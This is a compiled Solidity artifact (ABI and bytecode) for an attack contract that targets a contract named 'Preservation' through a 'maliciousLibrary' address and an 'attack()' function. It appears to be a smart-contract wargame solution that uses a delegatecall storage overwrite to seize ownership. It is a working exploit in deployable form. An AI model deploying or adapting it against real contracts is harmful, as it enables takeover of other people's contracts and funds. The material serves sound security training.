{"abi":[{"type":"constructor","inputs":[{"name":"_preservation","type":"address","internalType":"address"},{"name":"_maliciousLibrary","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"maliciousLibrary","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"preservation","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract Preservation"}],"stateMutability":"view"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b50604051610225380380610225833981016040819052602b916074565b5f80546001600160a01b039384166001600160a01b0319918216179091556001805492909316911617905560a0565b80516001600160a01b0381168114606f575f5ffd5b919050565b5f5f604083850312156084575f5ffd5b608b83605a565b9150609760208401605a565b90509250929050565b610178806100ad5f395ff3fe608060405234801561000f575f5ffd5b506004361061003f575f3560e01c806357c1e64a146100435780639e5faafc14610072578063cc6002c71461007c575b5f5ffd5b600154610056906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b61007a61008e565b005b5f54610056906001600160a01b031681565b5f5460015460405163078f013160e51b81526001600160a01b03918216600482015291169063f1e02620906024015f604051808303815f87803b1580156100d3575f5ffd5b505af11580156100e5573d5f5f3e3d5ffd5b50505f5460405163078f013160e51b81523360048201526001600160a01b03909116925063f1e0262091506024015f604051808303815f87803b15801561012a575f5ffd5b505af115801561013c573d5f5f3e3d5ffd5b5050505056fea26469706673582212200e4a54b6c8339fb297f8a3de38971586ebecab0882cd74999245c15e95dcd66864736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","maliciousLibrary()":"57c1e64a","preservation()":"cc6002c7"},"id":0}